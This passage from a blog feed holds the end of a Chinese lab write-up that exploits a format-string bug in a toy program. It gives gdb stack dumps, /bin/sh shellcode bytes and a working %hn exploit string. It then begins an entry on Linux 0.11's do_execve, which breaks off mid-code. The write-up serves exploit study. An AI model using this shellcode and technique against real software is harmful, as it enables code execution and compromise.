class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 2, 0x08048493 <span class="keyword">in</span> main (argc=2, argv=0xbffff1e4) at fmt.c:13</span><br><span class="line">13<span class="built_in">printf</span>( argv[1]);</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff090:0xbffff3a10xbffff3a10xb7fd7b480x00000001</span><br><span class="line">0xbffff0a0:0xe1f7c9310x68510bb00x68732f2f0x69622f68</span><br><span class="line">0xbffff0b0:0xcde3896e0x909090800xbffff24e0xbffff24c</span><br><span class="line">0xbffff0c0:0x313934250x257839310x682430310x3231256e</span><br><span class="line">0xbffff0d0:0x783938360x243131250x00006e680x00000000</span><br><span class="line">0xbffff0e0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff0f0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff100:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff110:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff120:0x000000020xbffff1e40xbffff1f00xbffff150</span><br><span class="line">(gdb) </span><br><span class="line">0xbffff130:0x000000000xb7fb50000x000000000xb7e1b637</span><br><span class="line">0xbffff140:0xb7fb50000xb7fb50000x000000000xb7e1b637</span><br><span class="line">0xbffff150:0x000000020xbffff1e40xbffff1f00x00000000</span><br><span class="line">0xbffff160:0x000000000x000000000xb7fb50000xb7fffc04</span><br><span class="line">0xbffff170:0xb7fff0000x000000000xb7fb50000xb7fb5000</span><br><span class="line">0xbffff180:0x000000000x09129cd80x359bd2c80x00000000</span><br><span class="line">0xbffff190:0x000000000x000000000x000000020x08048340</span><br><span class="line">0xbffff1a0:0x000000000xb7feff100xb7fea7800xb7fff000</span><br><span class="line">0xbffff1b0:0x000000020x080483400x000000000x08048361</span><br><span class="line">0xbffff1c0:0x0804843b0x000000020xbffff1e40x080484b0</span><br><span class="line">(gdb) </span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>如果最终的画面和这个差不多，那说明快要成功了。(注意下面的指令是我经过修正执行过后的，我仅仅是按上方向键来显示而已，并非又重新执行)可以清楚的看到ret值被修改成了shellcode的首地址。上面的exp中的%10$hn和%11$hn是从printf调用处开始数，第10个四字节和第11个四字节这两个地址printf将会以16位的方式写入之前输出的字符个数。(可以数数看)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 2, 0x08048493 <span class="keyword">in</span> main (argc=2, argv=0xbffff1e4) at fmt.c:13</span><br><span class="line">13<span class="built_in">printf</span>( argv[1]);</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff090:0xbffff3a10xbffff3a10xb7fd7b480x00000001</span><br><span class="line">0xbffff0a0:0xe1f7c9310x68510bb00x68732f2f0x69622f68</span><br><span class="line">0xbffff0b0:0xcde3896e0x909090800xbffff14e0xbffff14c</span><br><span class="line">0xbffff0c0:0x313934250x257839310x682430310x3231256e</span><br><span class="line">0xbffff0d0:0x783934340x243131250x00006e680x00000000</span><br><span class="line">0xbffff0e0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff0f0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff100:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff110:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff120:0x000000020xbffff1e40xbffff1f00xbffff150</span><br><span class="line">(gdb) </span><br><span class="line">0xbffff130:0x000000000xb7fb50000x000000000xb7e1b637</span><br><span class="line">0xbffff140:0xb7fb50000xb7fb50000x000000000xbffff0a0</span><br><span class="line">0xbffff150:0x000000020xbffff1e40xbffff1f00x00000000</span><br><span class="line">0xbffff160:0x000000000x000000000xb7fb50000xb7fffc04</span><br><span class="line">0xbffff170:0xb7fff0000x000000000xb7fb50000xb7fb5000</span><br><span class="line">0xbffff180:0x000000000x7704a5490x4b8deb590x00000000</span><br><span class="line">0xbffff190:0x000000000x000000000x000000020x08048340</span><br><span class="line">0xbffff1a0:0x000000000xb7feff100xb7fea7800xb7fff000</span><br><span class="line">0xbffff1b0:0x000000020x080483400x000000000x08048361</span><br><span class="line">0xbffff1c0:0x0804843b0x000000020xbffff1e40x080484b0</span><br><span class="line">(gdb) run $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x4e\xf1\xff\xbf\x4c\xf1\xff\xbf%49119x%10$hn%12449x%11$hn&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>键入c继续运行查看栈空间.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x080484a5 <span class="keyword">in</span> main (argc=2, argv=0xbffff1e4) at fmt.c:15</span><br><span class="line">15&#125;</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff14c:0xbffff0a00x000000020xbffff1e40xbffff1f0</span><br><span class="line">0xbffff15c:0x000000000x000000000x000000000xb7fb5000</span><br><span class="line">0xbffff16c:0xb7fffc040xb7fff0000x000000000xb7fb5000</span><br><span class="line">0xbffff17c:0xb7fb50000x000000000x7704a5490x4b8deb59</span><br><span class="line">0xbffff18c:0x000000000x000000000x000000000x00000002</span><br><span class="line">0xbffff19c:0x080483400x000000000xb7feff100xb7fea780</span><br><span class="line">0xbffff1ac:0xb7fff0000x000000020x080483400x00000000</span><br><span class="line">0xbffff1bc:0x080483610x0804843b0x000000020xbffff1e4</span><br><span class="line">0xbffff1cc:0x080484b00x080485100xb7fea7800xbffff1dc</span><br><span class="line">0xbffff1dc:0xb7fff9180x000000020xbffff36e0xbffff3a1</span><br><span class="line">(gdb) </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>单步走,看指令可以执行确实运行在shellcode空间内了。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(gdb) si</span><br><span class="line">0xbffff0a0 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) x/20i <span class="variable">$eip</span></span><br><span class="line">=&gt; 0xbffff0a0:xor    %ecx,%ecx</span><br><span class="line">   0xbffff0a2:mul    %ecx</span><br><span class="line">   0xbffff0a4:mov    <span class="variable">$0xb</span>,%al</span><br><span class="line">   0xbffff0a6:push   %ecx</span><br><span class="line">   0xbffff0a7:push   <span class="variable">$0x68732f2f</span></span><br><span class="line">   0xbffff0ac:push   <span class="variable">$0x6e69622f</span></span><br><span class="line">   0xbffff0b1:mov    %esp,%ebx</span><br><span class="line">   0xbffff0b3:int    <span class="variable">$0x80</span></span><br><span class="line">   0xbffff0b5:nop</span><br><span class="line">   0xbffff0b6:nop</span><br><span class="line">   0xbffff0b7:nop</span><br><span class="line">   0xbffff0b8:dec    %esi</span><br><span class="line">   0xbffff0b9:icebp  </span><br><span class="line">   0xbffff0ba:(bad)  </span><br><span class="line">   0xbffff0bb:mov    <span class="variable">$0xbffff14c</span>,%edi</span><br><span class="line">   0xbffff0c0:and    <span class="variable">$0x31313934</span>,%eax</span><br><span class="line">   0xbffff0c5:cmp    %edi,0x25(%eax)</span><br><span class="line">   0xbffff0c8:xor    %esi,(%eax)</span><br><span class="line">   0xbffff0ca:and    <span class="variable">$0x68</span>,%al</span><br><span class="line">   0xbffff0cc:outsb  %ds:(%esi),(%dx)</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure><ul><li>再次键入c由于没有断点了会火力全开。Got it!可以看到新的shell已经成功运行。并且回弹了。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">process 30736 is executing new program: /bin/bash</span><br><span class="line">To run a <span class="built_in">command</span> as administrator (user <span class="string">&quot;root&quot;</span>), use <span class="string">&quot;sudo &lt;command&gt;&quot;</span>.</span><br><span class="line">See <span class="string">&quot;man sudo_root&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">pgp@Rutk1t0r:ch04$ ps</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">28187 pts/13   00:00:00 bash</span><br><span class="line">30013 pts/13   00:00:01 gdb</span><br><span class="line">30736 pts/13   00:00:00 sh</span><br><span class="line">30988 pts/13   00:00:00 ps</span><br><span class="line">pgp@Rutk1t0r:ch04$</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="直接运行呢"><a href="#直接运行呢" class="headerlink" title="直接运行呢?"></a>直接运行呢?</h1><ul><li>如果按照上述情况我们直接./fmt $(exp)即可获取shell。但是发现并不能，我还怀疑过是否是权限问题，用root之后发现栈指针又不一样又继续调整，gdb是可以但是直接运行还是不可以。因此才有了换成/bin/nc的shellcode的想法(因为怀疑回弹的shell和当前shell重复，但是输入exit后当前shell都退出了，说明没有子shell)。然后必然猜测shell直接执行可执行程序和用gdb调试可执行程序的esp必然不一样，导致exp注入失败。然后就想着用书上的知识去读栈空间的某些特定值，来修正偏移。首先我们观察栈空间中某些值是否和栈的值大致匹配，有可能是局部变量压入。我们可以先直接读出argc，根据上面测试的例程可以知道其偏移为48。为了esp不继续变化我将前面字符进行填充。观察到偏移量为39的地方貌似有一个跟具体栈空间相关的值，读出来，然后进行偏移修正。根据在调试的时候39偏移处的值与ret地址的差，然后在实际运行的时候读出来的值应该也是这个差值，因此来修正我们的exp。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pgp@Rutk1t0r:ch04$ ./fmt $<span class="string">&#x27;%48$x\n&#x27;</span></span><br><span class="line">2</span><br><span class="line">pgp@Rutk1t0r:ch04$ ./fmt  $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\xce\xfa\xff\xbf\xcc\xfa\xff\xbfAAAAAAAAAAAAAAAAAAAA%48$x\n&#x27;</span></span><br><span class="line">1����</span><br><span class="line">     Qh//shh/bin��̀�����������AAAAAAAAAAAAAAAAAAAA2</span><br><span class="line">pgp@Rutk1t0r:ch04$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pgp@Rutk1t0r:ch04$ ./fmt  $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\xce\xfa\xff\xbf\xcc\xfa\xff\xbfAAAAAAAAAAAAAAAAAAAA%39$x\n&#x27;</span></span><br><span class="line">1����</span><br><span class="line">     Qh//shh/bin��̀�����������AAAAAAAAAAAAAAAAAAAAbffff1a0</span><br><span class="line">pgp@Rutk1t0r:ch04$ </span><br></pre></td></tr></table></figure><ul><li>最终的exp为<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x9e\xf1\xff\xbf\x9c\xf1\xff\xbf%49119x%10$hn%12529x%11$hn&#x27;</span></span><br></pre></td></tr></table></figure></li><li>这是我用ssh登录时候的场景，如果直接在本地运行估计又不一样，因此还需要随机应变。<br><img src="/images/The_Shellcodes_Handbook_ch04_successful.png" alt="The_Shellcodes_Handbook_ch04_successful.png"></li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>完成本次实验感觉是很艰难的，不同于简单的栈溢出漏洞，直接用字符覆盖高地址处的ret(函数的返回指针)即可控制eip。而printf类的格式化字符串漏洞需要精心构造地址值并反复修正。若想修复的话可以下载glibc源码将%$n等特性去掉重新编译后安装。这样可以加大利用难度，因此很多地方都建议不用printf类函数。各类语言也将类似功能的函数进行高度封装来提高安全性。本地实验的测试exp在<a href="https://github.com/embpgp/the_shellcoders_handbook/blob/master/code/ch04/test.txt">这里</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;可参考资料不限于但包括:&lt;br&gt;&lt;a href=&quot;http://bbs.pediy.com/&quot;&gt;0day安全 软件漏洞分析技术&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/24489276&quot;&gt;https://zhuanlan.zhihu.com/p/24489276&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.cis.syr.edu/~wedu/seed/&quot;&gt;逆向工程学习平台&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.xfocus.net/articles/200103/123.html&quot;&gt;http://www.xfocus.net/articles/200103/123.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.freebuf.com/articles/system/74224.html&quot;&gt;http://www.freebuf.com/articles/system/74224.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://nullablesecurity.blogspot.co.uk/&quot;&gt;http://nullablesecurity.blogspot.co.uk/&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://bbs.pediy.com/showthread.php?t=123602&quot;&gt;Exploit 编写教程&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://github.com/shiyanlou/seedlab/blob/master/formatstring.md&quot;&gt;https://github.com/shiyanlou/seedlab/blob/master/formatstring.md&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://staff.ustc.edu.cn/~billzeng/seclab/selab02.pdf&quot;&gt;http://staff.ustc.edu.cn/~billzeng/seclab/selab02.pdf&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X/ref=sr_1_1?ie=UTF8&amp;qid=1483684023&amp;sr=8-1&amp;keywords=shellcoders+handbook&quot;&gt;The Shellcoder’s Handbook&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
      <category term="misc" scheme="https://embpgp.github.io/categories/study/misc/"/>
    
    
      <category term="C/C++" scheme="https://embpgp.github.io/tags/C-C/"/>
    
      <category term="exploit" scheme="https://embpgp.github.io/tags/exploit/"/>
    
      <category term="shellcode" scheme="https://embpgp.github.io/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>Linux内核0.11完全注释 0.11的loader-&gt;execve</title>
    <link href="https://embpgp.github.io/2016/12/30/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-0-11%E7%9A%84loader-execve/"/>
    <id>https://embpgp.github.io/2016/12/30/Linux内核0-11完全注释-0-11的loader-execve/</id>
    <published>2016-12-30T15:28:46.000Z</published>
    <updated>2025-03-11T12:14:38.963Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>着重分析操作系统的加载器是如何运行程序的。</p></blockquote><span id="more"></span><hr><h1 id="从fork到execve"><a href="#从fork到execve" class="headerlink" title="从fork到execve"></a>从fork到execve</h1><p>根据Linux操作系统的设计原理,在Linux 0.11版本里面，进程0是手动创建的，进程1(init)是fork到进程0的，并且后续进程都是以1号进程为最顶层父进程。如果仅仅是fork只能实现所谓的多进程并发操作，而想要加载新的内容的话必须使用execve系统调用，将数据和代码从其他介质(比如硬盘)通过文件系统加载到内存，将原有进程代码和数据”冲刷掉”，现代Linux操作系统大体上也是这样的。</p><h1 id="do-execve"><a href="#do-execve" class="headerlink" title="do_execve()"></a>do_execve()</h1><ul><li><p>根据Linux操作系统内核的编码习惯*do_*开头的一般为系统调用或者中断的下半部函数。在后续的Linux内核版本里面允许进程在内核态被抢占(几乎总是在中断里面)就主要是执行下半部的时候开放中断。个人认为所谓被抢占即不是自愿放弃CPU时间(即任务自身进程空间内主动直接或者间接调用schedule函数进行任务调度和切换),而主要是由于时钟中断(所谓操作系统的脉搏)而引发的周期性的任务调度。但是在0.11版本里面当发生时钟中断的时候会检查当前的cs是否为0x0f(0.11代码段选择子写死)，如果不是的话表明刚刚从另外一个任务的内核态切换过来的，控制流程立即返回，而不进行调度。</p></li><li><p>在反汇编的时候会经常发现C库的crt过程先push三个参数，然后call main,最后再返回。<br><img src="/images/Linux_0.11_fs_exec_new_stack.png" alt="Linux_0.11_fs_exec_new_stack.png"></p></li><li><p>用户层执行exec类lib函数库簇或者直接通过系统调用嵌入汇编等方式触发系统调用,因此至少传递filename、argv、envp等参数，貌似envp经常由编译链接过程自动填充。</p></li><li><p>函数首先检查是否为用户层通过系统调用过来的，如果不是则panic。</p></li><li><p>linus认为128K的空间足够来存储环境变量和参数,因此立即先将这段空间初始化为0</p></li><li><p>可执行文件必须为普通文件</p></li><li><p>根据文件的set标志位等检查进程是否有权限执行该文件</p></li><li><p>先处理是否为脚本类可执行文件，因此直接读出文件的第一块内容，看第一行是否为<code>#!</code>,该约定在内核里面写死，因此如果不是则不能执行脚本。</p></li><li><p>如果是脚本的话将改造参数顺序，如原来为<code>./example.sh -arg1 -arg2</code>变为<code>interp -iarg1 -iarg2 example.sh -arg1 -arg2</code>，即把可执行文件送往解释脚本里面去(注意没有约定说一定要为#!/bin/sh,例如#!/bin/cat等自己可以试试)，而解释脚本(如bash)本身为elf格式的二进制可执行文件，可被直接加载到内存交由CPU执行，有种”偷天换日”的感觉，但事实就是这样，而解释脚本(一般为bash)进一步怎么处理那是它的事情，可参考GNU的各种/bin/目录下文件的实现(例如GNU bash)。</p></li><li><p>之后便将参数一一填充至顶端,并取得解释程序i节点继续goto处理，第二次的处理将在这个if语句<code>if ((bh-&gt;b_data[0] == &#39;#&#39;) &amp;&amp; (bh-&gt;b_data[1] == &#39;!&#39;) &amp;&amp; (!sh_bang)) &#123;</code>跳出到brelse(bh)。</p></li><li><p>然后便直接开始二进制程序的识别了,0.11版本的仅仅支持ZMAGIC格式的可执行映像。下图为0.11系统中hello程序的磁盘映像布局。(精通处理器指令集的大牛可以尝试不需要编译器链接器手动创建一个程序…)<br><img src="/images/Linux_0.11_fs_exec_ZMAGIC_header.png" alt="Linux_0.11_fs_exec_ZMAGIC_header.png"></p></li><li><p>处理掉原来进程的一些”后事”之后便修改task_struct结构的某些字段，置返回地址为新程序的入口，栈指针为环境块、参数块p,如果调度程序待会儿调度到本进程运行，则立即触发no_page异常，页面处理程序将磁盘上的代码和数据载入相应线性地址映射的物理地址处即可按需加载执行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * &#x27;do_execve()&#x27; executes a new program.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//// execve()系统中断调用函数。加载并执行子进程</span></span><br><span class="line"><span class="comment">// 该函数是系统中断调用（int 0x80）功能号__NR_execve调用的函数。函数的参数是进</span></span><br><span class="line"><span class="comment">// 入系统调用处理过程后直接到调用本系统调用处理过程和调用本函数之前逐步压入栈中</span></span><br><span class="line"><span class="comment">// 的值。</span></span><br><span class="line"><span class="comment">// eip - 调用系统中断的程序代码指针。</span></span><br><span class="line"><span class="comment">// tmp - 系统中断中在调用_sys_execve时的返回地址，无用；</span></span><br><span class="line"><span class="comment">// filename - 被执行程序文件名指针；</span></span><br><span class="line"><span class="comment">// argv - 命令行参数指针数组的指针；</span></span><br><span class="line"><span class="comment">// envp - 环境变量指针数组的指针。</span></span><br><span class="line"><span class="comment">// 返回：如果调用成功，则不返回；否则设置出错号，并返回-1.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_execve</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> * eip,<span class="keyword">long</span> tmp,<span class="keyword">char</span> * filename,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">char</span> ** argv, <span class="keyword">char</span> ** envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">inode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exec</span> <span class="title">ex</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> page[MAX_ARG_PAGES];</span><br><span class="line"><span class="keyword">int</span> 